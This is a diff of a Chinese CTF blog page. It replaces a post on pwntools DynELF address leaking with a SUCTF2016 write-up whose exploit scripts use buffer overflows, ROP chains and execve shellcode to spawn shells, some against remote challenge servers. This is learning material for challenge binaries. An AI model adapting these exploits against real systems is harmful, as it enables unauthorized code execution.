@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="pwn," />
+  <meta name="keywords" content="writeup,pwn," />
 
 
 
@@ -81,16 +81,16 @@
 
 
 
-<meta name="description" content="本文是针对一步一步学rop之x86篇中的test2的一种memory leak（内存泄漏）的方法，是通过pwntools中DynELF模块来进行内存搜索。在ctf比赛中常常会遇到一种不提供libc.so的题目，都可以利用这样的方法在内存中寻找system()地址。">
+<meta name="description" content="题目链接">
 <meta property="og:type" content="article">
-<meta property="og:title" content="pwn学习之DynELF的使用">
-<meta property="og:url" content="http://yunnigu.dropsec.xyz/2016/11/19/pwn学习之DynELF的使用/index.html">
+<meta property="og:title" content="pwn之第二更SUCTF2016">
+<meta property="og:url" content="http://yunnigu.dropsec.xyz/2016/11/29/pwn之第二更SUCTF2016/index.html">
 <meta property="og:site_name" content="YungGong">
-<meta property="og:description" content="本文是针对一步一步学rop之x86篇中的test2的一种memory leak（内存泄漏）的方法，是通过pwntools中DynELF模块来进行内存搜索。在ctf比赛中常常会遇到一种不提供libc.so的题目，都可以利用这样的方法在内存中寻找system()地址。">
-<meta property="og:updated_time" content="2020-04-27T08:38:06.949Z">
+<meta property="og:description" content="题目链接">
+<meta property="og:updated_time" content="2020-04-27T08:47:00.196Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="pwn学习之DynELF的使用">
-<meta name="twitter:description" content="本文是针对一步一步学rop之x86篇中的test2的一种memory leak（内存泄漏）的方法，是通过pwntools中DynELF模块来进行内存搜索。在ctf比赛中常常会遇到一种不提供libc.so的题目，都可以利用这样的方法在内存中寻找system()地址。">
+<meta name="twitter:title" content="pwn之第二更SUCTF2016">
+<meta name="twitter:description" content="题目链接">
 
 
 
@@ -120,13 +120,13 @@
 
 
 
-  <link rel="canonical" href="http://yunnigu.dropsec.xyz/2016/11/19/pwn学习之DynELF的使用/"/>
+  <link rel="canonical" href="http://yunnigu.dropsec.xyz/2016/11/29/pwn之第二更SUCTF2016/"/>
 
 
 
 
 
-  <title>pwn学习之DynELF的使用 | YungGong</title>
+  <title>pwn之第二更SUCTF2016 | YungGong</title>
   
 
 
@@ -233,7 +233,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yunnigu.dropsec.xyz/2016/11/19/pwn学习之DynELF的使用/">
+    <link itemprop="mainEntityOfPage" href="http://yunnigu.dropsec.xyz/2016/11/29/pwn之第二更SUCTF2016/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Yun">
@@ -250,7 +250,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">pwn学习之DynELF的使用</h1>
+          <h1 class="post-title" itemprop="name headline">pwn之第二更SUCTF2016</h1>
         
 
         <div class="post-meta">
@@ -262,8 +262,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2016-11-19T15:54:57+08:00">
-                2016-11-19
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2016-11-29T16:00:48+08:00">
+                2016-11-29
               </time>
             
 
@@ -300,64 +300,211 @@
       
 
       
-        <p>本文是针对一步一步学rop之x86篇中的test2的一种memory leak（内存泄漏）的方法，是通过pwntools中DynELF模块来进行内存搜索。在ctf比赛中常常会遇到一种不提供libc.so的题目，都可以利用这样的方法在内存中寻找system()地址。<br><a id="more"></a></p>
-<h2 id="leak函数"><a href="#leak函数" class="headerlink" title="leak函数"></a>leak函数</h2><pre><code>#!python
-def leak(address):
-    payload1 = &apos;a&apos;*140 + p32(plt_write) + p32(vulfun_addr) + p32(1) +p32(address) + p32(4)
-    p.send(payload1)
-    data = p.recv(4)
-    print &quot;%#x =&gt; %s&quot; % (address, (data or &apos;&apos;).encode(&apos;hex&apos;))
-return data
-</code></pre><p>随后将这个函数作为参数再调用d = DynELF(leak, elf=ELF(‘./test2’))就可以对DynELF模块进行初始化了。然后可以通过调用system_addr = d.lookup(‘system’, ‘libc’)来得到libc.so中system()在内存中的地址。</p>
-<h2 id="寻找地址"><a href="#寻找地址" class="headerlink" title="寻找地址"></a>寻找地址</h2><p>通过DynELF模块只能获取到system()在内存中的地址，但无法获取字符串“/bin/sh”在内存中的地址。所以我们在payload中需要调用read()将“/bin/sh”这字符串写入到程序的.bss段中。.bss段是用来保存全局变量的值的，地址固定，并且可以读可写。所以首先要找到bss段的地址通过readelf -S level2这个命令就可以获取到bss段的地址了。</p>
-<p>因为我们在执行完read()之后要接着调用system(“/bin/sh”)，并且read()这个函数的参数有三个，所以我们需要一个pop pop pop ret的gadget用来保证栈平衡。这个gadget非常好找，用objdump就可以轻松找到。</p>
-<p>最后需要寻找的就是vulfun_add,直接用gdb反编译一下程序就可以了。</p>
-<pre><code>da$ disassemble vlun_fun 
-Dump of assembler code for function vlun_fun:
-   0x0804844d &lt;+0&gt;:    push   ebp
-   0x0804844e &lt;+1&gt;:    mov    ebp,esp
-   0x08048450 &lt;+3&gt;:    sub    esp,0x98
-   0x08048456 &lt;+9&gt;:    mov    DWORD PTR [esp+0x8],0x100
-   0x0804845e &lt;+17&gt;:    lea    eax,[ebp-0x88]
-   0x08048464 &lt;+23&gt;:    mov    DWORD PTR [esp+0x4],eax
-   0x08048468 &lt;+27&gt;:    mov    DWORD PTR [esp],0x0
-   0x0804846f &lt;+34&gt;:    call   0x8048310 &lt;read@plt&gt;
-   0x08048474 &lt;+39&gt;:    leave  
-   0x08048475 &lt;+40&gt;:    ret    
-</code></pre><p>和明显地址是0x0804844d</p>
-<h2 id="最终的exp"><a href="#最终的exp" class="headerlink" title="最终的exp"></a>最终的exp</h2><p>整个攻击过程如下：首先通过DynELF获取到system()的地址后，我们又通过read将“/bin/sh”写入到.bss段上，最后再调用system（.bss），执行“/bin/sh”。最终的exp如下:</p>
-<pre><code>#!python
-#!/usr/bin/env python
+        <p><a href="http://pan.baidu.com/s/1ge73Bn9" target="_blank" rel="external">题目链接</a><br><a id="more"></a></p>
+<h2 id="pwn100"><a href="#pwn100" class="headerlink" title="pwn100"></a>pwn100</h2><p>从来没见过这样的pwn，IDA分析一下直接就看到了flag，这是什么鬼？</p>
+<p>但是本着初学者的心态，还是乖乖的写了exp，这个题只要覆盖地址到关键函数，输入zhimakaimen就可以看到flag。</p>
+<p>本地调试代码如下：</p>
+<pre><code>from pwn import *
+
+
+io=process(&apos;./pwn100&apos;)
+get_flag=0x0804865D
+password=&apos;zhimakaimen&apos;
+def exp():
+
+
+    payload=&apos;A&apos;*111+chr(0)+p32(get_flag)
+    io.sendline(payload)
+    io.sendline(password)
+    io.interactive()
+
+
+if __name__==&apos;__main__&apos;:
+    exp()
+</code></pre><h2 id="pwn200"><a href="#pwn200" class="headerlink" title="pwn200"></a>pwn200</h2><p>这个题目应该是x86下的rop的考查，IDA可以看到有system()函数，可以将‘/bin/sh’写入到bss段里获得shell</p>
+<p>本地调试的代码如下：</p>
+<pre><code>from pwn import *
+
+io=process(&apos;./pwn200&apos;)
+
+systemplt=0x080483c0
+readplt=0x080483a0
+bssadd=0x0804a040
+pppr=0x080485fd
+
+def exp():
+
+
+    payload=&apos;A&apos;*112+p32(readplt)+p32(pppr)+p32(0)+p32(bssadd)+p32(8)+p32(systemplt)+p32(0xdeadbeef)+p32(bssadd)
+    ##payload+=&apos;C&apos;*(256-len(payload))
+    io.sendline(payload)
+    io.send(&quot;/bin/sh\0&quot;)
+    io.interactive()
+
+
+if __name__==&apos;__main__&apos;:
+    exp()
+</code></pre><h2 id="pwn300"><a href="#pwn300" class="headerlink" title="pwn300"></a>pwn300</h2><p>这个题目一到手分析之后就想利用DynElf去泄漏system地址，然后将/bin/sh写入bss段提shell，但是脚本最后不能运行，之后发现程序居然是静态编译成的！！！</p>
+<p>之后学习了利用mmap函数映射内存空间将shellcode写入到里面，然后就可以提shell，具体脚本如下：</p>
+<pre><code>from pwn import *
+
+#r = remote(&quot;106.75.84.74&quot;, 10001)#pwn
+r = remote(&quot;118.193.194.73&quot;,10002)#pwn
+#r = process(&quot;./pwn300&quot;)
+
+mmap = 0x08052420
+main = 0x08048254
+read = 0x080518A0
+
+r.recvuntil(&quot;payload:&quot;)
+payload = &quot;a&quot;*0x70
+payload += p32(mmap)
+payload += p32(main)
+payload += p32(0xb6ffd000)
+payload += p32(0x100)
+payload += p32(0x7)
+payload += p32(0x22)
+payload += p32(0xffffffff)
+payload += p32(0)
+r.sendline(payload)
+
+r.recvuntil(&quot;payload:&quot;)
+payload = &quot;a&quot;*0x68
+payload += p32(read)
+payload += p32(0xb6ffd000)
+payload += p32(0)
+payload += p32(0xb6ffd000)
+payload += p32(0x40)
+r.sendline(payload)
+
+payload = &quot;\x31\xc0\x31\xd2\x31\xdb\x31\xc9\x31\xc0\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x31\xc0\xb0\x0b\xcd\x80&quot;
+
+r.sendline(payload)
+r.interactive()
+</code></pre><p>里面涉及到mmap的几个参数, 主要是prot和flags,<br>其值的定义在 glibc/bits/mman-linux.h 文件中:</p>
+<pre><code>#define PROT_READ        0x1                /* Page can be read.  */
+#define PROT_WRITE       0x2                /* Page can be written.  */
+#define PROT_EXEC        0x4                /* Page can be executed. */
+#define PROT_NONE        0x0                /* Page can not be accessed.  */
+</code></pre><p>这个prot的4个参数, 根linux的权限设置差不多, 这里我把映射的地址设为 rwx , 所以其值为7<br>然后是flags的定义:</p>
+<pre><code>#define MAP_SHARED        0x01           /* Share changes.  */
+#define MAP_PRIVATE       0x02           /* Changes are private.  */
+#define MAP_FIXED         0x10           /* Interpret addr exactly.  */
+#ifdef __USE_MISC
+# define MAP_FILE         0
+# ifdef __MAP_ANONYMOUS
+#  define MAP_ANONYMOUS   __MAP_ANONYMOUS /* Don&apos;t use a file.  */
+# else
+#  define MAP_ANONYMOUS   0x20            /* Don&apos;t use a file.  */
+# endif
+# define MAP_ANON        MAP_ANONYMOUS
+</code></pre><p>flags我们需要设置 MAP_ANONYMOUS 和 MAP_PRIVATE</p>
+<p>需要注意的是题目里面还有个小坑，</p>
+<p>在0x08048257下个断点，此时的esp=0xffffcfd8<br>之后在0x0804825a下断点，此时的esp=0xffffcfd0<br>执行之后平白无故少了8个字节<br>所以v5的地址esp+1C从64变为6c，所以第一段payload是70，然而执行shellcode的时候地址最低位已经是0了，所以第二个payload是68</p>
+<p>由于文件是静态编译的，也可以通过ROPgadget直接寻找rop链，ROPgadget –binary pwn300 –ropchain</p>
+<pre><code>from pwn import *
+r = process(&quot;./pwn300&quot;)
+
+from struct import pack
+
+# Padding goes here
+p = &apos;&apos;
+
+p += pack(&apos;&lt;I&apos;, 0x08052676) # pop edx ; ret
+p += pack(&apos;&lt;I&apos;, 0x080ca160) # @ .data
+p += pack(&apos;&lt;I&apos;, 0x08097d94) # pop eax ; ret
+p += &apos;/bin&apos;
+p += pack(&apos;&lt;I&apos;, 0x08079281) # mov dword ptr [edx], eax ; ret
+p += pack(&apos;&lt;I&apos;, 0x08052676) # pop edx ; ret
+p += pack(&apos;&lt;I&apos;, 0x080ca164) # @ .data + 4
+p += pack(&apos;&lt;I&apos;, 0x08097d94) # pop eax ; ret
+p += &apos;//sh&apos;
+p += pack(&apos;&lt;I&apos;, 0x08079281) # mov dword ptr [edx], eax ; ret
+p += pack(&apos;&lt;I&apos;, 0x08052676) # pop edx ; ret
+p += pack(&apos;&lt;I&apos;, 0x080ca168) # @ .data + 8
+p += pack(&apos;&lt;I&apos;, 0x080977cf) # xor eax, eax ; ret
+p += pack(&apos;&lt;I&apos;, 0x08079281) # mov dword ptr [edx], eax ; ret
+p += pack(&apos;&lt;I&apos;, 0x0805269e) # pop ebx ; ret
+p += pack(&apos;&lt;I&apos;, 0x080ca160) # @ .data
+p += pack(&apos;&lt;I&apos;, 0x0805269d) # pop ecx ; pop ebx ; ret
+p += pack(&apos;&lt;I&apos;, 0x080ca168) # @ .data + 8
+p += pack(&apos;&lt;I&apos;, 0x080ca160) # padding without overwrite ebx
+p += pack(&apos;&lt;I&apos;, 0x08052676) # pop edx ; ret
+p += pack(&apos;&lt;I&apos;, 0x080ca168) # @ .data + 8
+p += pack(&apos;&lt;I&apos;, 0x080977cf) # xor eax, eax ; ret
+p += pack(&apos;&lt;I&apos;, 0x0806a60f) # inc eax ; ret
+p += pack(&apos;&lt;I&apos;, 0x0806a60f) # inc eax ; ret
+p += pack(&apos;&lt;I&apos;, 0x0806a60f) # inc eax ; ret
+p += pack(&apos;&lt;I&apos;, 0x0806a60f) # inc eax ; ret
+p += pack(&apos;&lt;I&apos;, 0x0806a60f) # inc eax ; ret
+p += pack(&apos;&lt;I&apos;, 0x0806a60f) # inc eax ; ret
+p += pack(&apos;&lt;I&apos;, 0x0806a60f) # inc eax ; ret
+p += pack(&apos;&lt;I&apos;, 0x0806a60f) # inc eax ; ret
+p += pack(&apos;&lt;I&apos;, 0x0806a60f) # inc eax ; ret
+p += pack(&apos;&lt;I&apos;, 0x0806a60f) # inc eax ; ret
+p += pack(&apos;&lt;I&apos;, 0x0806a60f) # inc eax ; ret
+p += pack(&apos;&lt;I&apos;, 0x0804884d) # int 0x80
+print len(p)+0x68
+
+r.sendline(payload)
+r.interactive()
+</code></pre><h2 id="pwn400"><a href="#pwn400" class="headerlink" title="pwn400"></a>pwn400</h2><p>本题主要的思路就是利用DynELF泄漏system地址，然后将/bin/sh写入bss段，还有就是通过Gadget的利用</p>
+<pre><code># -*-coding:utf-8-*-
+
 from pwn import *
-elf = ELF(&apos;./test2&apos;)
-plt_write = elf.symbols[&apos;write&apos;]
-plt_read = elf.symbols[&apos;read&apos;]
-vulfun_addr = 0x0804844d
 
-def leak(address):
-    payload1 = &apos;a&apos;*140 + p32(plt_write) + p32(vulfun_addr) + p32(1) +p32(address) + p32(4)
-    p.send(payload1)
-    data = p.recv(4)
-    print &quot;%#x =&gt; %s&quot; % (address, (data or &apos;&apos;).encode(&apos;hex&apos;))
+r = remote(&quot;23.106.148.10&quot;,20000)#pwn
+#r = process(&quot;./simple&quot;)
+
+write_plt = 0x00000000004004B0
+read_plt = 0x00000000004004D0
+main = 0x0000000004005F6
+bss = 0x000000000600a70 + 0x100
+
+pop_rdi_ret = 0x00000000004006c3
+pop_rsi_pop_r15_ret = 0x00000000004006c1
+
+def leak(addr):
+    r.recvuntil(&quot;luck!\n&quot;)
+    payload = &quot;a&quot;*0x28
+    payload += p64(pop_rdi_ret)
+    payload += p64(0x1)
+    payload += p64(pop_rsi_pop_r15_ret)
+    payload += p64(addr)
+    payload += p64(0x6161616161616161)
+    payload += p64(write_plt)
+    payload += p64(main)
+    r.sendline(payload)
+    data = r.recv(8)
     return data
-p = process(&apos;./test2&apos;)
-gdb.attach(p,&quot;b *0x804850d&quot;)
-#p = remote(&apos;127.0.0.1&apos;, 10002)
-d = DynELF(leak, elf=ELF(&apos;./test2&apos;))
-system_addr = d.lookup(&apos;system&apos;, &apos;libc&apos;)
-print &quot;system_addr=&quot; + hex(system_addr)
-bss_addr = 0x0804a024
-pppr = 0x804850d
-payload2 = &apos;a&apos;*140  + p32(plt_read) + p32(pppr) + p32(0) + p32(bss_addr) + p32(8) 
-payload2 += p32(system_addr) + p32(vulfun_addr) + p32(bss_addr)
-payload2 += &apos;C&apos; * (256 - len(payload2))
-#ss = raw_input()
-print &quot;\n###sending payload2 ...###&quot;
-p.send(payload2)
-p.send(&quot;/bin/sh\0&quot;)
-p.interactive()
-</code></pre><p>这个exp在32kali上可以获得权限，在我的64位Ubuntu上无法获得权限，不知道为什么，纠结。。。。。。</p>
 
+d = DynELF(leak, main, elf=ELF(&apos;./simple&apos;))
+system_addr = d.lookup(&apos;system&apos;, &apos;libc&apos;)
+print &quot;[*] system addr:{0}&quot;.format(hex(system_addr))
+
+r.recvuntil(&quot;luck!\n&quot;)
+payload = &quot;a&quot; * 0x28
+payload += p64(pop_rdi_ret)
+payload += p64(0x0)
+payload += p64(pop_rsi_pop_r15_ret)
+payload += p64(bss)
+payload += p64(0x6161616161616161)
+payload += p64(read_plt)
+payload += p64(main)
+r.sendline(payload)
+
+r.sendline(&quot;/bin/sh&quot;)
+
+r.recvuntil(&quot;luck!\n&quot;)
+payload = &quot;a&quot; * 0x28
+payload += p64(pop_rdi_ret)
+payload += p64(bss)
+payload += p64(system_addr)
+r.sendline(payload)
+
+
+r.interactive()
+</code></pre>
       
     </div>
     
@@ -374,6 +521,8 @@ p.interactive()
       
         <div class="post-tags">
           
+            <a href="/tags/writeup/" rel="tag"># writeup</a>
+          
             <a href="/tags/pwn/" rel="tag"># pwn</a>
           
         </div>
@@ -387,8 +536,8 @@ p.interactive()
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2016/11/19/pwn学习rop之x86篇/" rel="next" title="pwn学习rop之x86篇">
-                <i class="fa fa-chevron-left"></i> pwn学习rop之x86篇
+              <a href="/2016/11/28/python基于numpy解方程组/" rel="next" title="python基于numpy解方程组">
+                <i class="fa fa-chevron-left"></i> python基于numpy解方程组
               </a>
             
           </div>
@@ -397,8 +546,8 @@ p.interactive()
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2016/11/21/pwn学习rop之x64篇/" rel="prev" title="pwn学习rop之x64篇">
-                pwn学习rop之x64篇 <i class="fa fa-chevron-right"></i>
+              <a href="/2016/12/05/reverse第二更之问鼎杯2106-6-2/" rel="prev" title="reverse第二更之问鼎杯2106-6-2">
+                reverse第二更之问鼎杯2106-6-2 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -529,7 +678,7 @@ p.interactive()
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#leak函数"><span class="nav-number">1.</span> <span class="nav-text">leak函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#寻找地址"><span class="nav-number">2.</span> <span class="nav-text">寻找地址</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#最终的exp"><span class="nav-number">3.</span> <span class="nav-text">最终的exp</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#pwn100"><span class="nav-number">1.</span> <span class="nav-text">pwn100</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pwn200"><span class="nav-number">2.</span> <span class="nav-text">pwn200</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pwn300"><span class="nav-number">3.</span> <span class="nav-text">pwn300</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pwn400"><span class="nav-number">4.</span> <span class="nav-text">pwn400</span></a></li></ol></div>
             
 
           </div>
